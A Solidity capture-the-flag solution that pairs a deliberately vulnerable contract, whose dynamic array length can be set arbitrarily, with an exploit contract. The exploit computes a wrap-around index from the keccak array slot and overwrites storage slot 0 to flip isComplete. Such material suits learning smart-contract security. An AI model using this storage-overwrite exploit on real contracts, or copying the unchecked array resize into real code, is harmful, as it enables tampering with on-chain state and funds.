pragma solidity ^0.4.21;

contract MappingChallenge {
    bool public isComplete;
    uint256[] map;

    function set(uint256 key, uint256 value) public {
        // Expand dynamic array as needed
        if (map.length <= key) {
            map.length = key + 1;
        }

        map[key] = value;
    }

    function get(uint256 key) public view returns (uint256) {
        return map[key];
    }
}

/**
    slot0 isComplete 0
    slot1 map.length
    slot80084422859880547211683076133703299733277748156566366325829078699459944778998 map[0]

    maxUint - slot(map[0]) + 1 = x => map[x] = slot0 
 */
contract MappingTester {
    uint256 public slot;
    uint256 public keySlot0;

    function MappingTester(address _challengeContract) public {
        MappingChallenge challengeContract = MappingChallenge(
            _challengeContract
        );
        slot = uint256(keccak256(uint256(1)));
        keySlot0 = uint256(-1) - slot + 1;
        challengeContract.set(keySlot0, 1);
    }
}
